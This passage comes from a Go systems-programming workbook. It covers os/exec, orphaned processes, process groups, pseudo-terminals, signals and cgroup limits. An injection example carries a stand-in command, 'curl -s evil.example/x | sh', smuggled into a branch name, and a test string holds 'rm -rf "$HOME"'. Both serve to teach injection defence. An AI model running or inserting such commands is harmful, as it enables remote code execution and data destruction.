#import "../template/book.typ": *
#import "05-lib.typ": ts, needspace

#step(9, 13, "Lab 9: Orphans", label: <sec-os-exec>)

Platform tools shell out constantly: `git`, `terraform`, `helm`, `kubectl`,
compilers, a customer's hook script. `os/exec` makes starting a process
look trivial. Stopping it correctly is the hard part, and this lab shows
the standard library's default leaving a process behind.

=== What happens when you run a command

`exec.Command(name, args...)` resolves `name` against `PATH` (unless it
contains a slash), and `Start` asks the kernel for a new process. On Linux
the runtime uses `clone(2)` with `CLONE_VFORK|CLONE_VM`: the child shares
the parent's memory just long enough to set up file descriptors, process
group and credentials, then calls `execve(2)` to replace itself with the
new program. That avoids copying the page tables of a large Go process for
a child that is about to discard them. `execve` keeps the PID, the open
descriptors that lack `O_CLOEXEC`, the signal mask and resource limits,
and replaces everything else.

#goconcept(title: [`os/exec`])[
  `cmd := exec.CommandContext(ctx, "git", "log", "--oneline")` describes a
  command; nothing runs yet. Set fields before starting it: `cmd.Dir`,
  `cmd.Env` (`append(os.Environ(), "K=V")` to add to the parent's),
  `cmd.Stdin`, `cmd.Stdout`, `cmd.Stderr` (any reader or writer).
  `cmd.Run()` starts it and waits; `cmd.Output()` does the same and returns
  standard output; `cmd.Start()` then `cmd.Wait()` splits the two so you
  can do something in between. A non-zero exit is an error of type
  `*exec.ExitError`, with the status in `ExitCode()`. Every started command
  must be waited for, or it stays a zombie until your program exits.
]

If `Stdout` is an `*os.File`, the child gets that descriptor directly. If
it is any other `io.Writer`, `os/exec` creates a pipe and a goroutine that
copies from it, and `Wait` waits for that copy to finish; remember that,
because it is behind one of the bugs in step 10. `Wait` collects the exit
status and frees the kernel's record of the child. Since Go 1.23, `os` uses
pidfds for `Wait` and `Signal` on Linux 5.4+, so a signal can never hit an
unrelated process that reused the PID.

#interview(title: [“What happens when you run a command from Go?”])[
  Walk down the layers. `exec.Command` resolves the binary on `PATH` (and
  since Go 1.19 refuses a match in the current directory, returning
  `exec.ErrDot`). `Start` creates the child with `clone` and `CLONE_VFORK`,
  sets up stdin, stdout, stderr and any `ExtraFiles`, applies
  `SysProcAttr` (process group, credentials, namespaces), and calls
  `execve`. Pipes to non-file writers get a copying goroutine. `Wait`
  reaps the child with `wait4` or a pidfd and joins the copy goroutines.
  Then add the production points: no shell, so arguments cannot be
  injected; a context with `Cancel` and `WaitDelay` so a stuck child cannot
  hang you; and a process group so cancellation reaches grandchildren.
]

=== No shell

The single most important rule is to pass arguments as a list and never
build a shell command string. `execve` receives an argument vector, so
`$(...)`, `;`, `*` and quotes have no meaning unless a shell parses them.
Two smaller injection routes remain. An argument starting with `-` can be
read as an option, which is why the example below uses Git's
`--end-of-options` (most tools accept `--` for the same purpose). And
`PATH` itself is input: Go 1.19 stopped `exec.LookPath` from returning
programs found through a relative `PATH` entry such as `.`, which used to
let a malicious repository plant its own `git` in the working directory.

#code(file: "injection.go", caption: "don't ship the first one")[```go
// branch comes from a webhook payload. A branch named
//   main; curl -s evil.example/x | sh
// runs the attacker's script with the CI runner's credentials.
exec.Command("sh", "-c", "git log --oneline "+branch).Output()

// The argument list goes straight to execve. No shell ever parses it.
exec.CommandContext(ctx, "git", "log", "--oneline", "--end-of-options", branch)
```]

If you need a pipeline, build it in Go: connect the commands with
`cmd2.Stdin, _ = cmd1.StdoutPipe()` and `Wait` for both. The image you have
been using makes the rule easy to remember, because it has no shell at all
(the first troubleshooting row below).

=== Cancellation and the leak

`exec.CommandContext` kills the child when the context is done. Before Go
1.20 that meant `SIGKILL` and nothing else.

#newingo("1.20", title: [`Cmd.Cancel` and `Cmd.WaitDelay`])[
  `Cancel` is the function called when the context is done; the default is
  `Process.Kill`. Setting it lets you send `SIGTERM` instead and give the
  child a chance to clean up. `WaitDelay` bounds what happens next: after
  the context is done (or the child has exited) and `WaitDelay` has
  passed, `os/exec` kills the child if it is still running and closes the
  pipes it was copying from, so `Wait` returns even if something else
  still holds them. Without `WaitDelay`, `Wait` reads pipes until EOF,
  which may be never.
]

Neither knob reaches _grandchildren_, and most interesting commands have
some. A `make` runs compilers, a shell script runs its pipeline, `helm`
runs plugins, `terraform` runs providers. `orphans` reproduces the shape
with a worker that starts a long-running sleeper and waits for it, then
cancels the worker with the standard library's default behaviour and lists
the processes before and after. Create `cmd/orphans/main.go`, starting
with the comment, imports and `main`:

#src("workbook/ch05/step9/cmd/orphans/main.go", region: "imports")
#src("workbook/ch05/step9/cmd/orphans/main.go", region: "main")

`main` plays all three parts: with `-role=worker` it is the worker, which
runs the sleeper like a shell script would and waits for it; with
`-role=sleeper` it sleeps for an hour; without a role it is the tool. The
`nolint` comment acknowledges that the worker starts its child without a
context, which is the point: the worker stands for someone else's script.
Add `run`, which starts the worker, lets it start its sleeper, cancels, and
looks:

#src("workbook/ch05/step9/cmd/orphans/main.go", region: "run")

`start` is where step 10 will add a second way to start the worker; for
now there is one:

#src("workbook/ch05/step9/cmd/orphans/main.go", region: "start")

The small `waiter` interface is all `run` needs from a started command, and
it is what lets step 10 return a different type from the same function.
Last, a `ps` built on `sysinfo.Processes`, plus the command line from
`/proc/<pid>/cmdline`, whose arguments are separated by NUL bytes:

#src("workbook/ch05/step9/cmd/orphans/main.go", region: "ps")

#checkpoint(step: 9, of: 13, title: [Orphans])[
  #output("ch05/s9-tree.txt", cmd: "ls -C cmd fsx sysinfo")
  #output("ch05/s9-test.txt", cmd: "go vet ./... && go test ./...")
  Rebuild the Linux binaries and the image, then run `orphans` with
  `--init`, so that orphans are re-parented to a PID 1 that reaps them:
  #output("ch05/s9-orphans.txt", cmd: "docker run --rm --init oskit /orphans")
  #troubleshoot(
    ([#ts("s9-noshell.txt")], [You asked the image for a shell. `FROM scratch` images contain only what you copied in, so there is no `/bin/sh`, `ps` or `sleep`.], [Run the binaries directly; that is why the demos re-run themselves.]),
    ([#ts("s9-path.txt")], [The worker was started by name (`"orphans"`), and the image has no `PATH` entry containing it.], [Start `os.Executable()`, an absolute path.]),
    ([#ts("s9-lint.txt")], [The `nolint` comment on the worker's `exec.Command` is missing. The `noctx` linter wants every command to have a context, which is right for real code.], [In real code use `exec.CommandContext`; here keep the comment.]),
  )
]

`Wait` returned `signal: killed`, and from the tool's point of view the
job is over. The sleeper is still running. Its parent died, so the kernel
re-parented it to PID 1, here `docker-init`. Look at the `PGID` column too:
the worker and the sleeper are in the tool's process group, because
children inherit their parent's group. In a CI job the sleeper would keep
running until the runner tears down the machine, holding whatever it held:
a state lock, a port, a database connection, a mounted volume.

#step(10, 13, "Process groups", label: <sec-os-pgroup>)

Every process belongs to a _process group_, identified by the PID of its
leader, and `kill(2)` with a negative PID signals every member of the
group. Children inherit their parent's group. So if the tool puts the
worker in a new group, everything the worker starts lands in it too, and
the whole tree can be stopped with one call (@fig-os-pgroup). This step
builds `procx`, the package that does that for every command a tool runs.

#fig(caption: [With `Setpgid`, the worker leads a new group and its descendants join it. `Process.Kill` signals one PID; `kill(-pgid)` signals the group.])[
  #diagram(
    spacing: (24pt, 14pt),
    dnode((0, 0), [tool · PID 6\ group 6], kind: "dark"),
    dnode((1, 0), [worker · PID 12\ group 12 (leader)], kind: "accent"),
    dnode((2, 0), [sleeper · PID 18\ group 12], kind: "accent"),
    dnode((1, 1), [`Process.Kill()`\ → PID 12 only], kind: "warn"),
    dnode((2, 1), [`kill(-12, SIGTERM)`\ → 12 and 18], kind: "good"),
    dedge((0, 0), (1, 0), "-|>", label: [starts]),
    dedge((1, 0), (2, 0), "-|>", label: [starts]),
    dedge((1, 1), (1, 0), "--|>"),
    dedge((2, 1), (1, 0), "--|>"),
    dedge((2, 1), (2, 0), "--|>"),
  )
] <fig-os-pgroup>

=== The platform layer

Process groups are a Unix concept, so the code that creates and signals
them goes in a file for Unix systems. Create `procx/group_unix.go`:

#src("workbook/ch05/step10/procx/group_unix.go")

`SysProcAttr` is the platform-specific part of `exec.Cmd`, applied in the
child between `clone` and `execve`. `Setpgid: true` with `Pgid` 0 makes the
child the leader of a new group whose ID is its own PID. `signalGroup`
turns `ESRCH` ("no such process") into `os.ErrProcessDone`, the error the
standard library uses for the same situation. On other platforms there is
no group to create; Windows' closest equivalent is a Job object, which
this package does not implement. Create `procx/group_other.go`:

#src("workbook/ch05/step10/procx/group_other.go")

=== `procx.Command`

Create `procx/procx.go`. The package wraps `exec.Cmd` rather than
replacing it:

#src("workbook/ch05/step10/procx/procx.go", region: "head")

#goconcept(title: [Struct embedding])[
  A struct field with a type and no name, like `*exec.Cmd` in `Cmd`, is
  _embedded_: its fields and methods are promoted, so `c.Dir`, `c.Env`,
  `c.Stdout` and `c.Start()` all work on a `*procx.Cmd` as if it were an
  `*exec.Cmd`. A method declared on the outer type with the same name
  _shadows_ the promoted one, which is how `procx.Cmd.Wait` replaces
  `exec.Cmd.Wait` while still calling it as `c.Cmd.Wait()`. This is
  composition, not inheritance: the inner `exec.Cmd` knows nothing about
  `procx`, so its own `Run` calls its own `Wait`, never the outer one.
  That is why `procx` must also redefine `Run`, `Output` and
  `CombinedOutput`.
]

`Command` is `exec.CommandContext` with three changes: the group, a
`Cancel` that signals it, and a default grace period:

#src("workbook/ch05/step10/procx/procx.go", region: "command")

The flow on cancellation is: the context ends, `Cancel` sends `SIGTERM` to
the whole group, and everyone gets the same chance to clean up. If the
leader is still running `WaitDelay` later, `os/exec` sends it `SIGKILL` and
closes the pipes. Then `Wait` finishes the job:

#src("workbook/ch05/step10/procx/procx.go", region: "wait")

That last `SIGKILL` encodes a policy: _the leader's exit ends the group's
lifetime_. Anything still in the group when the command we started has
exited is a descendant it abandoned. Usually the call fails with `ESRCH`
because nothing is left. There is a small window in which the group's
number could be reused, since the kernel can recycle a PID once no process
uses it as a PID, group or session ID; for a tool that starts a handful of
commands this is negligible, and the airtight alternative is in the
production note at the end of this step.

`Run`, `Output`, `CombinedOutput` and `Signal` route through the new
`Wait`:

#src("workbook/ch05/step10/procx/procx.go", region: "run")

Process groups also change how terminal signals arrive. When you press
#kbd("Ctrl-C"), the terminal sends `SIGINT` to its _foreground_ process
group. A child in its own group no longer receives it. With `procx`,
#kbd("Ctrl-C") reaches only the tool, and the tool turns it into a context
cancellation (with `signal.NotifyContext`, or Chapter 4's
`lifecycle.NotifyContext`), which `procx` turns into `SIGTERM` for the
group. That is usually what you want: one orderly shutdown instead of
every process reacting to the keypress on its own. Other signals that
matter to the child, such as `SIGHUP` for reloads or `SIGWINCH` for window
resizes, have to be passed on explicitly. `Forward` does that:

#src("workbook/ch05/step10/procx/procx.go", region: "forward")

It subscribes to the signals with `signal.Notify` and relays each one to
the group from a goroutine until `stop` is called; `stop` unsubscribes,
ends the goroutine and waits for it, so goleak stays quiet. An interactive
child (an editor, `kubectl exec -it`, a password prompt) is the exception
to the whole scheme: it must stay in the terminal's foreground group,
because a background group that reads from the terminal is stopped with
`SIGTTIN`. Run it in your own group, or give it a pseudo-terminal (lab
11).

Last, a helper that turns `Wait`'s error into the status a shell would
report, which is what a wrapper tool should exit with:

#src("workbook/ch05/step10/procx/procx.go", region: "exitcode")

=== Tests that run real processes

The tests need children that behave in specific ways: sleep, start a
grandchild, ignore `SIGTERM`, print their arguments, wait for a signal.
Rather than depend on `sleep` or a shell, the test binary plays all of
those parts, selected by an environment variable, as `fsx`'s lock test
did. Create `procx/procx_test.go` with the helpers:

#src("workbook/ch05/step10/procx/procx_test.go", region: "helpers")

`alive` treats a zombie as dead, because a process the test has not
reaped yet still answers `kill(pid, 0)`. The first test is the one this
step exists for: cancel, and both the child and the grandchild are gone.

#src("workbook/ch05/step10/procx/procx_test.go", region: "test")

Then the grace period, abandoned descendants, and the pipe hang:

#src("workbook/ch05/step10/procx/procx_test.go", region: "grace")

The last test reproduces the most common hang in code that runs commands.
If a child starts a background process that inherits its stdout, and
`Stdout` is a buffer, `Output` waits for EOF on the pipe, which only comes
when the background process exits: here, after a minute. With
`WaitDelay`, `Output` returns after the delay with `exec.ErrWaitDelay`,
and the group kill removes the grandchild. The remaining tests check that
arguments reach the child unparsed, that `Forward` relays a signal, and
`ExitCode`:

#src("workbook/ch05/step10/procx/procx_test.go", region: "misc")

`TestArgumentsAreNotInterpretedByAShell` passes `$(touch pwned); rm -rf "$HOME" #` and checks the child sees exactly that string.

=== `orphans -kill group`

Give `orphans` the second mode. Replace the top of `cmd/orphans/main.go`
(the comment gains a line, the imports gain `oskit/procx`):

#src("workbook/ch05/step10/cmd/orphans/main.go", region: "imports")

Replace `start`, which now returns either kind of command; both satisfy
`waiter`:

#src("workbook/ch05/step10/cmd/orphans/main.go", region: "start")

and `main`, for the flag's help text:

#src("workbook/ch05/step10/cmd/orphans/main.go", region: "main")

#needspace(14em)
#checkpoint(step: 10, of: 13, title: [Process groups])[
  #output("ch05/s10-tree.txt", cmd: "ls -C cmd fsx procx sysinfo")
  #output("ch05/s10-test.txt", cmd: "go vet ./... && go test ./...")
  The `procx` tests, by name:
  #output("ch05/s10-procx.txt", cmd: "go test -v ./procx 2>&1 | grep -E '^(--- |ok)'")
  Rebuild the binaries and the image, and run `orphans` with the group:
  #output("ch05/s10-orphans.txt", cmd: "docker run --rm --init oskit /orphans -kill group")
  #troubleshoot(
    ([#ts("s10-nopgid.txt")], [`setGroup` is not called, so there is no group to signal: `SIGTERM` reaches nobody, `WaitDelay` later the leader gets `SIGKILL`, and the grandchildren survive.], [Call `setGroup(c.Cmd)` in `Command`.]),
    ([#ts("s10-kill.txt")], [`Cancel` calls `c.Process.Kill()`: the leader dies with `SIGKILL` (137) instead of getting `SIGTERM` (143) and a chance to clean up.], [Signal the group with `SIGTERM` in `Cancel`.]),
    ([#ts("s10-nowaitkill.txt")], [`Wait` does not kill the rest of the group, so a command that exits normally leaves its background children running.], [Restore the `SIGKILL` to the group after `c.Cmd.Wait()`.]),
  )
]

Compare the `PGID` column with lab 9: the worker and the sleeper now
share a group whose ID is the worker's PID, and the tool stays in its own.
`Wait` reports `signal: terminated`, the graceful signal, and nothing is
left.

#production(title: [When process groups are not enough])[
  A process can leave its group with `setsid` or `setpgid`, and daemons do
  exactly that. For a hard guarantee, put the command in its own cgroup:
  every descendant stays in the cgroup whatever it does, and since Linux
  5.14 writing `1` to the cgroup's `cgroup.kill` file kills all of them at
  once. systemd stops services this way, and `SysProcAttr.UseCgroupFD`
  (Go 1.20) starts a child directly in a cgroup you created. Go 1.26 added
  `Process.WithHandle`, which exposes the pidfd for code that needs to pass
  it to other system calls.
]

#step(11, 13, "Lab 11: Terminals", label: <sec-os-pty>)

Many programs behave differently when their output is a terminal. They
print colour, redraw progress bars with `\r`, prompt for input, and use
line-buffered output; piped into another program, they print plain text,
skip prompts, and buffer output in large blocks. C's standard library makes
that last switch automatically, which is why `python script.py | tee log`
appears to hang until the script exits. A tool that wraps another tool,
such as a deploy CLI running `terraform apply` and showing its progress,
gets the pipe behaviour unless it does something about it. This lab runs
one child both ways and prints the exact bytes the parent receives.

=== Is this a terminal?

The check programs use is `isatty`, which asks the kernel for the terminal
attributes of a descriptor. Only a terminal has them. The request is an
`ioctl` whose name differs between Linux and macOS, so the check is one
file per platform, plus a fallback. Create `cmd/ttydemo/term_linux.go`,
`term_darwin.go` and `term_other.go`:

#src("workbook/ch05/step11/cmd/ttydemo/term_linux.go")
#src("workbook/ch05/step11/cmd/ttydemo/term_darwin.go")
#src("workbook/ch05/step11/cmd/ttydemo/term_other.go")

The tempting shortcut, `fi.Mode()&os.ModeCharDevice != 0`, is wrong:
`/dev/null` is a character device too, so a program run with output
discarded would decide a person is watching. Chapter 9 covers terminal
detection, `NO_COLOR` and output design in depth.

=== A pseudo-terminal

A _pseudo-terminal_ (PTY) is a pair of devices: the child gets the
terminal side as its stdin, stdout and stderr, and the parent reads and
writes the other side. To the child it is indistinguishable from a real
terminal. The details (opening `/dev/ptmx`, setting up the child's session
and controlling terminal) are fiddly and platform-specific, and
`github.com/creack/pty` is the module most Go programs use for them. Add
it:

#output("ch05/s11-goget.txt", cmd: "go get github.com/creack/pty@v1.1.24")

Create `cmd/ttydemo/main.go`. Like the other demos, it is both the parent
and the child:

#src("workbook/ch05/step11/cmd/ttydemo/main.go", region: "ttyhead")

The child behaves like a typical CLI: if `isTerminal(os.Stdout)` is false
it prints two plain lines; otherwise it prints the terminal size, redraws a
progress line with `\r`, and finishes in green:

#src("workbook/ch05/step11/cmd/ttydemo/main.go", region: "child")

The parent runs it twice, first with `Output` (a pipe), then on a PTY with
`pty.StartWithSize`, which opens the pair, starts the command in a new
session with the PTY as its controlling terminal, and returns the parent's
side:

#src("workbook/ch05/step11/cmd/ttydemo/main.go", region: "run")

`show` prints each line with `%q`, so the control characters are visible:

#src("workbook/ch05/step11/cmd/ttydemo/main.go", region: "show")

#checkpoint(step: 11, of: 13, title: [Terminals])[
  #output("ch05/s11-tidy.txt", cmd: "go mod tidy")
  #output("ch05/s11-tree.txt", cmd: "ls -C cmd fsx procx sysinfo")
  #output("ch05/s11-test.txt", cmd: "go vet ./... && go test ./...")
  Run it on your machine, then rebuild the image and run it on Linux. The
  output is the same:
  #output("ch05/s11-build.txt", cmd: "go build -o bin/ ./cmd/...")
  #output("ch05/s11-mac.txt", cmd: "bin/ttydemo")
  #output("ch05/s11-docker.txt", cmd: "docker run --rm oskit /ttydemo")
  #troubleshoot(
    ([#ts("s11-nopty.txt")], [The `pty` module is not in `go.mod`.], [`go get github.com/creack/pty@v1.1.24`.]),
    ([#ts("s11-eio.txt")], [On Linux, reading the parent side after the child has exited returns `EIO`, not EOF, and the code treats it as a failure. macOS returns EOF, so this only shows up in the container.], [Treat `syscall.EIO` as the end of output.]),
    ([#ts("s11-setpgid.txt")], [`SysProcAttr.Setpgid` was set on a command started with `pty.Start`, which also sets `Setsid`. A session leader cannot be moved to another group, so the start fails.], [Do not combine `procx`'s group with a PTY; signal the session leader's group instead.]),
  )
]

Through the pipe the child saw no terminal and printed two plain lines.
Through the PTY it saw a 120 by 40 terminal, redrew its progress line
three times with carriage returns, and printed in green. Look at the line
endings as well: the program wrote `\n`, and the parent received `\r\n`.
The PTY's line discipline translates newlines (the `ONLCR` flag), as a real
terminal would.

#warning(title: [Do not scrape a PTY])[
  A PTY makes a child think a human is watching, so its output is designed
  for humans: escape codes, redraws, wrapped lines, spinners. Use a PTY to
  _relay_ output to a user (and copy the user's terminal size to it with
  `pty.Setsize`, re-sending on `SIGWINCH`). When your code needs to parse
  the output, ask the tool for a machine format instead: `--output json`,
  `--porcelain`, `--no-color`, or `NO_COLOR=1`.
]

#step(12, 13, "Lab 12: Signals", label: <sec-os-signals>)

Chapter 4 handled the two signals that mean "stop": `SIGINT` and
`SIGTERM`. A few more shape how platform tools behave, and this lab
reproduces two of them.

#table(
  columns: (auto, auto, 1fr),
  table.header([Signal], [Default], [What it means for a Go tool]),
  [`SIGINT`, `SIGTERM`], [terminate], [Stop soon. Handle with `signal.NotifyContext` (Chapter 4).],
  [`SIGHUP`], [terminate], [The terminal went away; for daemons, by convention, "reload your config".],
  [`SIGQUIT`], [core dump], [The Go runtime prints every goroutine's stack and exits (Chapter 4).],
  [`SIGPIPE`], [terminate], [The reader of a pipe has gone. Go's handling depends on the descriptor; see below.],
  [`SIGCHLD`], [ignore], [A child changed state. `os/exec` waits for its own children; orphans are PID 1's problem (step 8).],
  [`SIGWINCH`], [ignore], [The terminal was resized. Forward it to a child on a PTY.],
  [`SIGKILL`, `SIGSTOP`], [kill, stop], [Cannot be caught, blocked or ignored. Nothing in your process runs.],
)

=== SIGPIPE

When a process writes to a pipe whose reader has exited, the kernel sends
it `SIGPIPE`, whose default action is to terminate. That default is what
makes `producer | head -n 3` stop the producer instead of letting it run
forever. Go keeps the behaviour where it is useful and avoids it where it
is not: a write to a broken pipe on descriptor 1 or 2 kills the program
with `SIGPIPE`, while on any other descriptor, such as a network
connection, the write just fails with `EPIPE`. A server must not die
because one client disconnected.

There is a catch. If any code in the program calls `signal.Notify` for
`SIGPIPE`, including code in a dependency, the special case for stdout and
stderr is off, and writes there fail with `EPIPE` too. A loop that ignores
write errors then never ends. Create `cmd/sigpipe/main.go`:

#src("workbook/ch05/step12/cmd/sigpipe/main.go")

=== SIGHUP and live reloads

`SIGHUP` originally meant "the modem hung up". Daemons have no terminal,
so the signal was free, and the convention became "re-read your
configuration": nginx, Prometheus and sshd all reload on it. Combined with
atomic writes from step 5, it gives a config deploy with no restart and no
window in which the service runs without a valid config.

`reload` is a minimal service that does it. Create `cmd/reload/main.go`
with the comment and imports, then the config type and its loader:

#src("workbook/ch05/step12/cmd/reload/main.go", region: "imports")
#src("workbook/ch05/step12/cmd/reload/main.go", region: "config")

`load` parses _and validates_, and returns nothing usable until every
check has passed; the struct tags map the JSON keys to fields, as in
Chapter 4. Then a log helper and `main`:

#src("workbook/ch05/step12/cmd/reload/main.go", region: "main")

and the service loop:

#src("workbook/ch05/step12/cmd/reload/main.go", region: "run")

#goconcept(title: [`os/signal` and `atomic.Pointer[T]`])[
  `signal.Notify(ch, sigs...)` asks the runtime to deliver those signals to
  `ch` instead of applying their default action. Delivery never blocks: if
  the channel is full, the signal is dropped, so the channel must be
  buffered (`go vet` checks this). `signal.Stop(ch)` undoes it.
  `signal.NotifyContext` is the same for a context, which is how
  `SIGINT` and `SIGTERM` are handled here. `atomic.Pointer[Config]` is a
  pointer that many goroutines can read (`Load`) while one replaces it
  (`Store`, `Swap`), without a lock and without a data race. A request
  handler calls `cfg.Load()` once per request and uses that config
  throughout, so it never sees half of an old config and half of a new one.
]

The design choices are the important part. A bad config at startup is
fatal, because there is nothing to fall back to; a bad config at reload is
logged and ignored, because there is. The new config is fully parsed and
validated before it replaces the old one, and the swap is a single
`atomic.Pointer` operation, so request handlers see one config or the
other. The `SIGHUP` channel has a buffer of one: if three reload signals
arrive while a reload is running, they collapse into one more reload,
which is what you want. And `SIGTERM` still goes through
`signal.NotifyContext`, so the two mechanisms compose.

#needspace(14em)
#checkpoint(step: 12, of: 13, title: [Signals])[
  #output("ch05/s12-tree.txt", cmd: "ls -C cmd fsx procx sysinfo")
  #output("ch05/s12-test.txt", cmd: "go vet ./... && go test ./...")
  Build, then pipe `sigpipe` into `head` three ways. `PIPESTATUS[0]` is
  bash's record of the first command's exit status:
  #output("ch05/s12-build.txt", cmd: "go build -o bin/ ./cmd/...")
  #output("ch05/s12-sigpipe.txt")
  A full reload session, with `atomicput` doing the deploys. `$!` is the PID
  of the last background command:
  #output("ch05/s12-reload.txt")
  #troubleshoot(
    ([#ts("s12-hup.txt")], [`SIGHUP` was sent to a program without a handler (here `torn`), or before `signal.Notify` ran. The default action terminates it: 129 is 128 + 1.], [Register the handler first thing; see the warning below.]),
    ([#ts("s12-unbuffered.txt")], [The `SIGHUP` channel is unbuffered, so a signal that arrives while `run` is busy is dropped. `go vet` catches it.], [`make(chan os.Signal, 1)`.]),
    ([#ts("s12-badstart.txt")], [The config file is invalid at startup, so the service refuses to start. That is intended: there is no old config to keep.], [Fix the file. Only reloads fall back.]),
  )
]

The first `sigpipe` run is the default: three lines, then death by
`SIGPIPE`, status 141 (128 + 13), which shells treat as normal for a
pipeline. The second subscribed to `SIGPIPE` and ignored errors, and was
still spinning after a million failed writes; without the demo's cut-off
it would burn a CPU until someone noticed. The third checks the error and
exits 0. The rule for CLIs: check the error from every write to stdout,
and treat `EPIPE` as "the reader is done", not as a failure.

The reload session shows each path: a good config is swapped in, a bad one
is rejected with the old version kept, and `SIGTERM` stops the service
cleanly.

#warning(title: [`SIGHUP` kills by default])[
  If the signal arrives before `signal.Notify` runs, or the binary has no
  handler at all, the default action terminates the process. That makes
  "send SIGHUP to reload" dangerous across a fleet where some instances run
  an old binary without the handler. Register the handler first thing in
  `main`, and have deploy tooling check the version before signalling.
]

#step(13, 13, "Container limits", label: <sec-os-cgroup>)

The last step finishes `sysinfo` with the files a container's limits live
in, and builds `limits`, a tool that prints what the kernel enforces on it
and what the Go runtime made of that. It also brings the module to the
production code: after this step, `fsx`, `procx` and `sysinfo` are the
repository's `pkg/fsx`, `pkg/procx` and `pkg/sysinfo`.

=== Status and file descriptors

Two more `/proc` readers come first. `/proc/<pid>/status` is a list of
`Key: value` lines, and `/proc/<pid>/fd` is a directory with one entry per
open descriptor. Add them to the end of `sysinfo/proc.go`:

#src("workbook/ch05/step13/sysinfo/proc.go", region: "status")

Every open file, socket, pipe and epoll instance uses a descriptor, and
`RLIMIT_NOFILE` caps how many a process may hold. Reading the limit is a
Unix system call. Create `sysinfo/rlimit_unix.go` and
`sysinfo/rlimit_other.go`:

#src("workbook/ch05/step13/sysinfo/rlimit_unix.go")
#src("workbook/ch05/step13/sysinfo/rlimit_other.go")

=== cgroup v2

Containers are not a kernel feature; they are a combination of namespaces
(what a process can see) and control groups (what it can use). cgroup v2
arranges processes in one tree, mounted at `/sys/fs/cgroup`, and each
directory in the tree has files for the controllers enabled on it:

#table(
  columns: (auto, 1fr),
  table.header([File], [Meaning]),
  [`memory.max`], [Hard limit in bytes, or `max`. Exceeding it after reclaim fails triggers the OOM killer inside the group. This is Kubernetes' memory _limit_.],
  [`memory.high`], [Throttling threshold: above it, the group's allocations are slowed and reclaimed aggressively, but nothing is killed.],
  [`memory.current`, `memory.peak`], [Current usage, page cache included, and the high-water mark (`memory.peak` needs Linux 5.19).],
  [`cpu.max`], [`$QUOTA $PERIOD` in microseconds: `150000 100000` allows 1.5 CPUs of time per 100 ms period. This is the CPU _limit_; requests become `cpu.weight`.],
  [`pids.max`, `pids.current`], [Maximum number of tasks (processes and threads) in the group.],
)

#fig(placement: auto, caption: [The cgroup v2 path of a Kubernetes container (systemd cgroup driver). A limit on any directory along the path applies; inside its cgroup namespace, the container sees its own directory as the root.])[
  #diagram(
    spacing: (22pt, 8pt),
    dnode((0, 0), [`/sys/fs/cgroup`], kind: "muted"),
    dnode((0, 1), [`kubepods.slice`], kind: "default"),
    dnode((0, 2), [`kubepods-burstable.slice`], kind: "default"),
    dnode((0, 3), [`kubepods-burstable-pod<uid>.slice`], kind: "default"),
    dnode((0, 4), [`cri-containerd-<id>.scope`], kind: "accent"),
    dnode((1, 1), [node allocatable: all pods together], kind: "muted"),
    dnode((1, 2), [QoS class], kind: "muted"),
    dnode((1, 3), [pod: sum of its containers' limits], kind: "muted"),
    dnode((1, 4), [container: `memory.max`, `cpu.max`\ seen as `/` from inside], kind: "good"),
    dedge((0, 0), (0, 1), "-|>"),
    dedge((0, 1), (0, 2), "-|>"),
    dedge((0, 2), (0, 3), "-|>"),
    dedge((0, 3), (0, 4), "-|>"),
    dedge((0, 1), (1, 1), "--"),
    dedge((0, 2), (1, 2), "--"),
    dedge((0, 3), (1, 3), "--"),
    dedge((0, 4), (1, 4), "--"),
  )
] <fig-os-cgroup>

Create `sysinfo/cgroup.go` with the types:

#src("workbook/ch05/step13/sysinfo/cgroup.go", region: "head")

`ReadCgroup` finds the process's group from `/proc/self/cgroup` (a line
`0::/path` on cgroup v2), reads usage from that directory, and walks up to
the root taking the tightest limit, because a limit on any ancestor
applies:

#src("workbook/ch05/step13/sysinfo/cgroup.go", region: "cgroup")

and the helpers that parse the files. Every limit file holds a number or
the word `max`, except `cpu.max`, which holds two:

#src("workbook/ch05/step13/sysinfo/cgroup.go", region: "helpers")

=== Tests

Since the reader takes an `fs.FS`, the tests describe a container, a
systemd slice with a tighter parent limit, and a cgroup v1 host as `MapFS`
literals of a dozen lines each, and run on macOS. Add `errors` to the
imports of `sysinfo/sysinfo_test.go`:

#src("workbook/ch05/step13/sysinfo/sysinfo_test.go", region: "imports")

then the new tests at the end of the file, starting with `status`:

#src("workbook/ch05/step13/sysinfo/sysinfo_test.go", region: "status")
#src("workbook/ch05/step13/sysinfo/sysinfo_test.go", region: "fstest")
#src("workbook/ch05/step13/sysinfo/sysinfo_test.go", region: "ancestor")

The Linux-only file gets two real tests. Replace its imports:

#src("workbook/ch05/step13/sysinfo/sysinfo_linux_test.go", region: "imports")

and add the tests at the end:

#src("workbook/ch05/step13/sysinfo/sysinfo_linux_test.go", region: "cgroup")

=== `limits`

Create `cmd/limits/main.go`. Everything except the memory limit and the
descriptor experiment is one `run` that reads and prints:

#src("workbook/ch05/step13/cmd/limits/main.go", region: "limitshead")

`debug.SetMemoryLimit(-1)` reads the current limit without changing it (a
negative value means "just report"). The function `-set-memlimit` uses
comes next. If the operator has not set `GOMEMLIMIT` explicitly, it sets
the Go memory limit somewhat below `memory.max`:

#src("workbook/ch05/step13/cmd/limits/main.go", region: "memlimit")

`-exhaust-fds` leaks descriptors on purpose, the way a missing `Close`
does, one per "request":

#src("workbook/ch05/step13/cmd/limits/main.go", region: "exhaust")

and the formatting helpers finish the file:

#src("workbook/ch05/step13/cmd/limits/main.go", region: "format")

#needspace(14em)
#checkpoint(step: 13, of: 13, title: [Container limits])[
  #output("ch05/s13-tree.txt", cmd: "ls -C cmd fsx procx sysinfo")
  #output("ch05/s13-test.txt", cmd: "go vet ./... && go test ./...")
  On macOS there is no cgroup to read:
  #output("ch05/s13-build.txt", cmd: "go build -o bin/ ./cmd/...")
  #output("ch05/s13-mac.txt", cmd: "bin/limits")
  Rebuild the image, then run `limits` with no limits, with limits, and
  with `-set-memlimit`:
  #output("ch05/s13-none.txt", cmd: "docker run --rm oskit /limits")
  #output("ch05/s13-set.txt", cmd: "docker run --rm --cpus=1.5 --memory=256m --pids-limit=100 --ulimit nofile=1024:4096 \\\n    oskit /limits")
  #output("ch05/s13-memlimit.txt", cmd: "docker run --rm --cpus=1.5 --memory=256m oskit /limits -set-memlimit \\\n    | grep -E '^(memory.max|GOMAXPROCS|GOMEMLIMIT)'")
  Exhaust the descriptors under a limit of 256:
  #output("ch05/s13-fds.txt", cmd: "docker run --rm --ulimit nofile=256:256 oskit /limits -exhaust-fds")
  Finally, run every package's tests on Linux. Build the three test
